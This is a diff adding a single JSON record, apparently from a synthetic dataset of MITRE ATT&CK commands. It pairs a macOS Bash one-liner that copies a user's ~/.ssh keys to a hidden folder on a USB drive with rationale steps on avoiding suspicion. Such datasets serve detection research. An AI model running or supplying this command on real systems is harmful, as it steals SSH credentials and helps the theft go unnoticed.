@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/USB64/.config\" && cp -Rp \"$HOME/.ssh\" \"/Volumes/USB64/.config/\"",
+  "explanation": "Exfiltrates SSH keys and configs by copying the .ssh directory to a hidden folder on an attached USB drive.",
+  "rationale_steps": [
+    "Target sensitive credentials in $HOME/.ssh.",
+    "Use a mounted external drive at /Volumes/USB64 as the egress medium.",
+    "Preserve file metadata with cp -Rp to avoid suspicion.",
+    "Keep activity local to the endpoint with no network usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-e3b19f71",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
